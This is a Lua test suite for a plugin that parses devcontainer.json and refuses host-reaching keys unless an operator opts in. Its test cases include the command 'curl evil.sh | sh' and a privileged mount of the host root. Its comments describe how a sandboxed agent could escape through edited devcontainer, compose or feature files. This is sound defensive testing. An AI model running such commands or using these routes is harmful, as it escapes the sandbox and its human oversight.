-- Parsing `.devcontainer/devcontainer.json`, and the resolution it feeds.
--
-- Every decision here is about *which environment to build*, so none of it
-- needs a container runtime — which is the point. The failure this guards
-- against is building an environment quietly different from the one the editor
-- would build, and that is decidable from the file alone.

local devcontainer = require("devcontainer")

-- The plugin suite shares one Lua VM and loads every `*_test.lua` before
-- running any of them. `init_test.lua` replaces `cru.json` at LOAD time with an
-- encode-only stub, so by the time these bodies run `cru.json.decode` is gone.
-- Capture the real table now, while it is still intact, and install it per
-- test — the same save/restore discipline `container_test.lua` uses for
-- `cru.shell`.
local real_json = cru.json

--- Run `fn` with a stubbed filesystem and PATH.
---
--- `files` maps absolute path -> contents. Resolution reads the working tree,
--- so that is the whole story; `present` lists commands `cru.shell.which`
--- should find.
local function with_env(files, present, fn)
  local saved_fs, saved_shell, saved_json = cru.fs, cru.shell, cru.json
  local found = {}
  for _, name in ipairs(present or {}) do found[name] = true end

  cru.fs = {
    exists = function(path) return files[path] ~= nil end,
    read = function(path)
      if files[path] == nil then error("File not found: " .. path) end
      return files[path]
    end,
  }
  cru.shell = {
    which = function(cmd) return found[cmd] and ("/usr/bin/" .. cmd) or nil end,
    exec = function(cmd, args, opts)
      local passthrough = saved_shell and saved_shell.exec
      return passthrough and passthrough(cmd, args, opts)
    end,
  }
  cru.json = real_json

  local ok, err = pcall(fn)
  cru.fs, cru.shell, cru.json = saved_fs, saved_shell, saved_json
  if not ok then error(err, 0) end
end

--- Parse a devcontainer.json body as if it sat at `<workspace>/.devcontainer/`.
---
--- `allow_host` mirrors `[plugins.oci] devcontainer_host_access`. Most parsing
--- tests are about shape rather than trust and pass it; the ones asserting the
--- default refusal deliberately do not.
local function parse(text, workspace, allow_host)
  workspace = workspace or "/home/user/project"
  local out
  with_env({}, {}, function()
    out = devcontainer.parse(text, workspace, workspace .. "/.devcontainer", allow_host)
  end)
  return out
end

--- Parse with the host-reaching keys permitted, for tests about how a key is
--- converted rather than whether it is allowed.
local function parse_trusted(text, workspace)
  return parse(text, workspace, true)
end

local function parse_error(text, workspace, allow_host)
  local ok, err = pcall(parse, text, workspace, allow_host)
  assert.falsy(ok, "expected the file to be refused, but it parsed")
  return tostring(err)
end

local function contains(list, value)
  for _, v in ipairs(list or {}) do
    if v == value then return true end
  end
  return false
end

-- ─────────────────────────────────────────────────────────────────────────────

-- devcontainer.json is JSONC in practice: VS Code's own templates ship with
-- comments and trailing commas, and a strict decoder rejects both. Treating a
-- parse failure as "no devcontainer" would fall through to a profile and build
-- a different environment, which is the one thing this must never do.
describe("devcontainer.strip_jsonc", function()
  it("removes line comments", function()
    local out = devcontainer.strip_jsonc('{\n  // a comment\n  "image": "alpine"\n}')
    assert.is_nil(out:find("comment", 1, true))
    assert.truthy(out:find('"image"', 1, true))
  end)

  it("removes block comments", function()
    local out = devcontainer.strip_jsonc('{ /* nope\n still nope */ "image": "alpine" }')
    assert.is_nil(out:find("nope", 1, true))
    assert.truthy(out:find('"image"', 1, true))
  end)

  it("leaves a comment marker that is inside a string alone", function()
    local out = devcontainer.strip_jsonc('{ "name": "https://example.com/x" }')
    assert.truthy(out:find("https://example.com/x", 1, true))
  end)

  it("removes a trailing comma before a closing brace or bracket", function()
    local out = devcontainer.strip_jsonc('{ "runArgs": [ "a", "b", ],\n}')
    assert.is_nil(out:find(",%s*]"))
    assert.is_nil(out:find(",%s*}"))
  end)

  it("leaves a comma that is inside a string alone", function()
    local out = devcontainer.strip_jsonc('{ "name": "a, }" }')
    assert.truthy(out:find("a, }", 1, true))
  end)
end)

describe("devcontainer.parse honours", function()
  it("image", function()
    local env = parse('{ "image": "mcr.microsoft.com/devcontainers/base:jammy" }')
    assert.equals("mcr.microsoft.com/devcontainers/base:jammy", env.image)
  end)

  -- `build.dockerfile` is relative to the directory holding devcontainer.json,
  -- and `build.context` defaults to that directory — not to the workspace root.
  -- Resolving either against the wrong base builds a different image in silence.
  it("build.dockerfile relative to the devcontainer directory", function()
    local env = parse('{ "build": { "dockerfile": "Dockerfile" } }')
    assert.equals("/home/user/project/.devcontainer/Dockerfile", env.dockerfile)
    assert.equals("/home/user/project/.devcontainer", env.build_context)
  end)

  it("build.context relative to the devcontainer directory", function()
    local env = parse('{ "build": { "dockerfile": "Dockerfile", "context": ".." } }')
    assert.equals("/home/user/project/.devcontainer/..", env.build_context)
  end)

  it("build.args", function()
    local env = parse('{ "build": { "dockerfile": "Dockerfile", "args": { "VARIANT": "1.83" } } }')
    assert.equals("1.83", env.build_args.VARIANT)
  end)

  it("a string mount, converted to a -v spec", function()
    local env = parse_trusted(
      '{ "image": "alpine", "mounts": ["source=/host/cache,target=/cache,type=bind"] }')
    assert.equals("/host/cache:/cache", env.mounts[1])
  end)

  it("an object mount, converted to a -v spec", function()
    local env = parse_trusted(
      '{ "image": "alpine", "mounts": [{ "source": "/host/c", "target": "/c", "type": "bind" }] }')
    assert.equals("/host/c:/c", env.mounts[1])
  end)

  it("a read-only mount", function()
    local env = parse_trusted(
      '{ "image": "alpine", "mounts": ["source=/h,target=/c,type=bind,readonly=true"] }')
    assert.equals("/h:/c:ro", env.mounts[1])
  end)

  it("containerEnv", function()
    local env = parse('{ "image": "alpine", "containerEnv": { "RUST_LOG": "debug" } }')
    assert.equals("debug", env.env.RUST_LOG)
  end)

  it("remoteUser", function()
    local env = parse('{ "image": "alpine", "remoteUser": "vscode" }')
    assert.equals("vscode", env.user)
  end)

  it("runArgs", function()
    local env = parse_trusted('{ "image": "alpine", "runArgs": ["--cap-add", "SYS_PTRACE"] }')
    assert.equals("--cap-add", env.run_args[1])
    assert.equals("SYS_PTRACE", env.run_args[2])
  end)

  it("workspaceFolder", function()
    local env = parse('{ "image": "alpine", "workspaceFolder": "/src" }')
    assert.equals("/src", env.workspace_folder)
  end)

  -- The devcontainer default, which is NOT the plugin's /workspace default.
  -- The two must not be conflated: a devcontainer image expects its own layout,
  -- and existing [plugins.oci] configs expect theirs.
  it("the spec's default workspaceFolder when the file names none", function()
    local env = parse('{ "image": "alpine" }', "/home/user/my-project")
    assert.equals("/workspaces/my-project", env.workspace_folder)
  end)

  -- Keys that describe the editor, not the container. Refusing these would
  -- refuse nearly every real devcontainer.json for no gain — none of them can
  -- change what the container is for a headless agent.
  it("editor-only keys without refusing", function()
    local env = parse([[{
      "name": "My Project",
      "image": "alpine",
      "customizations": { "vscode": { "extensions": ["rust-lang.rust-analyzer"] } },
      "forwardPorts": [3000]
    }]])
    assert.equals("alpine", env.image)
  end)
end)

-- Variable substitution appears in most real devcontainer.json files. Left
-- unsubstituted the literal `${localWorkspaceFolderBasename}` reaches the
-- runtime as a directory name.
describe("devcontainer.parse substitutes", function()
  it("localWorkspaceFolder and its basename", function()
    local env = parse_trusted(
      '{ "image": "alpine", "workspaceFolder": "/workspaces/${localWorkspaceFolderBasename}",'
      .. ' "mounts": ["source=${localWorkspaceFolder}/.cache,target=/cache,type=bind"] }',
      "/home/user/thing")
    assert.equals("/workspaces/thing", env.workspace_folder)
    assert.equals("/home/user/thing/.cache:/cache", env.mounts[1])
  end)

  it("containerWorkspaceFolder against the resolved workspaceFolder", function()
    local env = parse(
      '{ "image": "alpine", "workspaceFolder": "/src",'
      .. ' "containerEnv": { "HERE": "${containerWorkspaceFolder}" } }')
    assert.equals("/src", env.env.HERE)
  end)

  -- Anything else would reach the runtime verbatim.
  it("and refuses a variable it cannot compute", function()
    local err = parse_error('{ "image": "alpine:${localEnv:TAG}" }')
    assert.truthy(err:find("localEnv:TAG", 1, true))
  end)
end)

-- The refuse-list is an allowlist. Enumerating only the keys the design names
-- would silently drop every key nobody thought of, which is the same
-- silent-downgrade failure the plugin exists to prevent.
describe("devcontainer.parse refuses", function()
  it("a key it cannot honour, naming that key", function()
    local err = parse_error('{ "image": "alpine", "remoteEnv": { "A": "1" } }')
    assert.truthy(err:find("remoteEnv", 1, true))
  end)

  it("a mount attribute it cannot honour, naming it", function()
    local err = parse_error(
      '{ "image": "alpine", "mounts": ["source=/h,target=/c,bind-propagation=shared"] }', nil, true)
    assert.truthy(err:find("bind-propagation", 1, true))
  end)

  it("a build key it cannot honour, naming it", function()
    local err = parse_error('{ "build": { "dockerfile": "Dockerfile", "cacheFrom": "x" } }')
    assert.truthy(err:find("cacheFrom", 1, true))
  end)

  it("a file that names neither an image nor a build", function()
    local err = parse_error('{ "name": "empty" }')
    assert.truthy(err:find("image", 1, true))
  end)

  it("a file that is not a JSON object", function()
    local err = parse_error('[1, 2, 3]')
    assert.truthy(err:find("object", 1, true))
  end)
end)

-- These are the keys the design says to delegate: honourable by
-- @devcontainers/cli and by nothing else this plugin has.
describe("devcontainer.parse defers to @devcontainers/cli for", function()
  local function cli_keys(text)
    return parse(text).cli_keys or {}
  end

  -- Gated by HOST_KEYS now — a feature may declare `privileged` and host
  -- mounts — so it reaches the CLI only once the operator permits it.
  it("features, once host access is permitted", function()
    local env = parse_trusted(
      '{ "image": "alpine", "features": { "ghcr.io/devcontainers/features/git:1": {} } }')
    assert.truthy(contains(env.cli_keys, "features"))
  end)

  -- Compose is host-gated first (see the trust block below), so this asks the
  -- question the deferral cares about: once past the gate, does it still reach
  -- the CLI rather than being swallowed?
  it("dockerComposeFile", function()
    assert.truthy(contains(parse_trusted(
      '{ "dockerComposeFile": "compose.yml", "service": "app" }').cli_keys or {},
      "dockerComposeFile"))
  end)

  -- `initializeCommand` is absent on purpose: the CLI runs it on the HOST, so
  -- it is a host key first and a CLI key second. See the trust block below.
  it("every lifecycle command that runs inside the container", function()
    for _, key in ipairs({
      "onCreateCommand", "updateContentCommand",
      "postCreateCommand", "postStartCommand", "postAttachCommand",
    }) do
      local text = '{ "image": "alpine", "' .. key .. '": "echo hi" }'
      assert.truthy(contains(cli_keys(text), key), key .. " must defer to the CLI")
    end
  end)

  -- A file needing the CLI needs no image of its own: the CLI builds it.
  it("without also demanding an image", function()
    local env = parse_trusted('{ "dockerComposeFile": "compose.yml", "service": "app" }')
    assert.is_not_nil(env.cli_keys)
  end)
end)

-- Reading only committed config was justified as a human boundary. It is not
-- one: the workspace is bind-mounted rw and `.git` rides along inside it, so a
-- sandboxed agent can commit as easily as it can write. What actually holds is
-- limiting what the file may ASK for — an image and a build decide what the
-- sandbox contains, `runArgs`/`mounts`/`initializeCommand` decide whether it is
-- one at all.
describe("devcontainer.parse refuses the keys that reach the host", function()
  for _, case in ipairs({
    { key = "runArgs", text = '{ "image": "alpine", "runArgs": ["--privileged"] }' },
    { key = "mounts", text = '{ "image": "alpine", "mounts": ["source=/,target=/host,type=bind"] }' },
    { key = "initializeCommand",
      text = '{ "image": "alpine", "initializeCommand": "curl evil.sh | sh" }' },
    -- Compose is the second door to the same escape. The devcontainer.json
    -- itself asks for nothing alarming, but the compose file it names sits in
    -- the same repo the agent can write and commit, and a service there can
    -- declare `privileged: true` and `volumes: ["/:/host"]`.
    { key = "dockerComposeFile",
      text = '{ "dockerComposeFile": "compose.yml", "service": "app" }' },
    { key = "service", text = '{ "image": "alpine", "service": "app" }' },
    { key = "runServices", text = '{ "image": "alpine", "runServices": ["db"] }' },
  }) do
    it(case.key .. " unless the operator opted in", function()
      local err = parse_error(case.text)
      assert.truthy(err:find(case.key, 1, true), "the refusal must name the key: " .. err)
      assert.truthy(err:find("devcontainer_host_access", 1, true),
        "and must say how to allow it: " .. err)

      -- ...and the opt-in genuinely re-enables it, so this is a gate rather
      -- than a removal.
      assert.truthy(parse_trusted(case.text))
    end)
  end

  -- `initializeCommand` is the subtle one: it is also a CLI key, and the CLI
  -- runs it on the host. Deferring before checking would hand the escape to
  -- @devcontainers/cli instead of refusing it.
  it("initializeCommand before deferring it to the CLI", function()
    local err = parse_error('{ "image": "alpine", "initializeCommand": "echo hi" }')
    assert.truthy(err:find("initializeCommand", 1, true))
  end)

  -- Gating a CLI key must not disable it: with the opt-in set, a compose
  -- devcontainer has to resolve exactly as before and still be handed to
  -- @devcontainers/cli, which is the only thing that can build it.
  it("but still defers a permitted compose devcontainer to the CLI", function()
    local text = '{ "dockerComposeFile": "compose.yml", "service": "app", "runServices": ["db"] }'
    local env = parse_trusted(text)
    for _, key in ipairs({ "dockerComposeFile", "service", "runServices" }) do
      assert.truthy(contains(env.cli_keys, key), key .. " must reach the CLI once permitted")
    end
  end)
end)

describe("devcontainer.resolve", function()
  local DC = "/home/user/project/.devcontainer/devcontainer.json"
  local FLAT = "/home/user/project/.devcontainer.json"

  it("reads .devcontainer/devcontainer.json", function()
    with_env({ [DC] = '{ "image": "alpine" }' }, {}, function()
      local env = devcontainer.resolve("/home/user/project")
      assert.equals("alpine", env.image)
    end)
  end)

  -- The other location the spec calls canonical. Missing it would fall through
  -- to a profile and build a different environment.
  it("reads a top-level .devcontainer.json", function()
    with_env({ [FLAT] = '{ "image": "alpine" }' }, {}, function()
      local env = devcontainer.resolve("/home/user/project")
      assert.equals("alpine", env.image)
    end)
  end)

  it("returns nil when the workspace has no devcontainer", function()
    with_env({}, {}, function()
      assert.is_nil(devcontainer.resolve("/home/user/project"))
    end)
  end)

  it("returns nil when there is no workspace to look in", function()
    with_env({}, {}, function()
      assert.is_nil(devcontainer.resolve(nil))
    end)
  end)

  -- The whole point of the deferral: with the CLI installed the environment is
  -- built by the tool that knows how, and the plugin adopts it.
  it("delegates to @devcontainers/cli when it is installed", function()
    with_env({ [DC] = '{ "image": "alpine", "postCreateCommand": "make" }' }, { "devcontainer" }, function()
      local env = devcontainer.resolve("/home/user/project")
      assert.truthy(env.cli, "an installed CLI must be used rather than refused")
    end)
  end)

  -- ...and without it, a refusal naming the key. Never a container built from
  -- the subset we happened to understand.
  it("refuses naming the key it cannot honour when the CLI is absent", function()
    with_env({ [DC] = '{ "image": "alpine", "postCreateCommand": "make" }' }, {}, function()
      local ok, err = pcall(devcontainer.resolve, "/home/user/project")
      assert.falsy(ok, "a devcontainer needing the CLI must not build a partial environment")
      assert.truthy(tostring(err):find("postCreateCommand", 1, true))
      assert.truthy(tostring(err):find("devcontainers/cli", 1, true),
        "the refusal must say what would honour it")
    end)
  end)

  -- End to end for the gated-but-permitted path: the compose devcontainer a
  -- team actually commits, with the operator opt-in set, still becomes a CLI
  -- session rather than a refusal.
  it("builds a permitted compose devcontainer through the CLI", function()
    local compose = '{ "dockerComposeFile": "compose.yml", "service": "app" }'
    with_env({ [DC] = compose }, { "devcontainer" }, function()
      local env = devcontainer.resolve("/home/user/project", true)
      assert.truthy(env.cli, "a permitted compose devcontainer must still be built by the CLI")
      assert.truthy(contains(env.cli_keys, "dockerComposeFile"))
    end)
  end)

  it("refuses a compose devcontainer without the operator opt-in", function()
    with_env({ [DC] = '{ "dockerComposeFile": "compose.yml", "service": "app" }' },
      { "devcontainer" }, function()
        local ok, err = pcall(devcontainer.resolve, "/home/user/project")
        assert.falsy(ok, "an installed CLI must not bypass the host gate")
        assert.truthy(tostring(err):find("dockerComposeFile", 1, true))
      end)
  end)

  it("names every deferred key, not just the first", function()
    with_env({ [DC] = '{ "image": "alpine", "onCreateCommand": "setup", "postCreateCommand": "make" }' },
      {}, function()
      local ok, err = pcall(devcontainer.resolve, "/home/user/project")
      assert.falsy(ok)
      assert.truthy(tostring(err):find("onCreateCommand", 1, true))
      assert.truthy(tostring(err):find("postCreateCommand", 1, true))
    end)
  end)
end)

-- `devcontainer up` reports its result as a JSON line on stdout, after however
-- much build log precedes it.
describe("devcontainer.up_result", function()
  it("reads the outcome line out of the build log", function()
    local out
    with_env({}, {}, function()
      out = devcontainer.up_result(
        "Building...\nStep 1/2\n" ..
        '{"outcome":"success","containerId":"abc123","remoteWorkspaceFolder":"/workspaces/p"}\n')
    end)
    assert.equals("success", out.outcome)
    assert.equals("abc123", out.containerId)
    assert.equals("/workspaces/p", out.remoteWorkspaceFolder)
  end)

  it("returns nil when the CLI printed no outcome", function()
    local out
    with_env({}, {}, function()
      out = devcontainer.up_result("npm ERR! not found\n")
    end)
    assert.is_nil(out)
  end)
end)

-- ─────────────────────────────────────────────────────────────────────────────
-- Committed-only resolution
-- ─────────────────────────────────────────────────────────────────────────────

--- A devcontainer is *container configuration*, and the sandboxed agent can
--- write it: `/workspace` is the host workspace through a rw bind mount, so
--- `write_file{path=".devcontainer/devcontainer.json"}` lands on the host and
--- the next session in that workspace resolves from it. `runArgs` becomes raw
--- runtime argv, so that session starts with whatever the previous one asked
--- for — `--privileged -v /:/host` included.
---
--- Resolution therefore reads the COMMITTED file, never the working tree. An
--- agent's write is unstaged, so it changes nothing until a human commits it,
--- which is the same trust boundary the repo already applies to code.

-- `features` looks like an ordinary build detail and is not one. A
-- devcontainer-feature.json may declare `privileged`, `capAdd`, `securityOpt`
-- and `mounts`, and the CLI merges them into the run arguments; a feature may
-- be referenced by a path inside the workspace, so nothing vets it. Measured
-- against the real CLI: a config naming only `image` and `./evilfeat` produced
-- --privileged, seccomp=unconfined and a bind mount of /.
describe("devcontainer.parse gates features like any other host key", function()
  local FEAT = '{ "image": "alpine", "features": { "./evilfeat": {} } }'

  it("refuses a local feature reference by default", function()
    local err = parse_error(FEAT)
    assert.truthy(err:find("features", 1, true), err)
    assert.truthy(err:find("devcontainer_host_access", 1, true), err)
  end)

  it("refuses a registry feature reference too", function()
    -- The registry is not the boundary: a published feature declares the same
    -- properties, and pinning it says nothing about what it asks for.
    local err = parse_error(
      '{ "image": "alpine", "features": { "ghcr.io/devcontainers/features/docker-in-docker:2": {} } }')
    assert.truthy(err:find("features", 1, true), err)
  end)

  it("defers to the CLI once the operator permits it", function()
    local env = parse_trusted(FEAT)
    assert.truthy(contains(env.cli_keys, "features"),
      "permitting the key must not change who honours it")
  end)
end)
